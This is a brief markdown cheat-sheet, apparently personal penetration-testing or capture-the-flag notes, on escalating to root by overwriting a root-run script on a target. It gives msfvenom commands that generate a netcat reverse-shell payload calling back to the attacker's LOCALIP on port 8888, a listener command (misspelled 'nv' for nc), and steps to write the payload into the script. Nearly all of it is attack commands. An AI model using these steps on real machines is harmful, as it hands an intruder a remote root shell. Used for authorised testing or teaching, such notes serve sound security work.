# Msfvenom
* If there is a script that we can write to that runs on root on the target machine:
	* Local: `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`
    * Local: `nv -lvp 8888`
    * Target: `echo <msfvenom output> > script`
    * Run script
